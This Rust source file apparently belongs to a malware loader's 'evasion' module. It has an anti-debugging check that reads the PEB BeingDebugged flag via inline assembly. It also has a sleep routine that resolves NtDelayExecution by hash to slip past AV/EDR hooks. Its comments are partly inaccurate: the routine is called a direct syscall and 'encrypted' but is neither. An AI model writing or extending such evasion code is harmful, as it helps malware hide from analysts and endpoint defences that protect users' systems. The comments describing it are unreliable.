// loader/src/evasion/anti_debug.rs


/// Check if the process is being debugged by inspecting the PEB's BeingDebugged flag.
pub fn check_debugger() -> bool {
     unsafe {
        // Check PEB BeingDebugged flag
        #[cfg(target_arch = "x86_64")]
        let peb: *mut u8;

        // Read the PEB address from the GS segment (only valid for user-mode, x64)
        std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);

        // The BeingDebugged flag is at offset 0x2 in the PEB structure
        let being_debugged = *peb.add(0x2);
        being_debugged != 0
    }
}

use crate::native::peb_parsing_by_hash::{find_function_by_hash, simple_hash, find_ntdll_simple};
use std::mem::transmute;

    
/// Perform a stealth sleep using direct syscall to `NtDelayExecution`
/// This avoids hooking from userland AV/EDR on `Sleep()` or `std::thread::sleep()`
pub fn encrypted_sleep(ms: u32) {
    unsafe {
        let ntdll_base = match find_ntdll_simple() {
            Some(addr) => addr,
            None => {
                return;
            }
        };

        // Compute hash of "NtDelayExecution" to use in the export resolver
        let nt_delay_hash = simple_hash("NtDelayExecution");
        let nt_delay_addr = match find_function_by_hash(ntdll_base, nt_delay_hash) {
            Some(addr) => addr,
            None => {
                return;
            }
        };

        // Transmute raw address to function pointer
        let nt_delay: extern "system" fn(u8, *mut i64) -> i32 = transmute(nt_delay_addr);

        // Delay is expressed in 100-nanosecond intervals (negative for relative time)
        let mut interval: i64 = -1 * (ms as i64) * 10_000;

        // Invoke the function
        let status = nt_delay(0, &mut interval as *mut i64);

        // Silently ignore if syscall fails
        if status != 0 {
            return;
        }
    }
}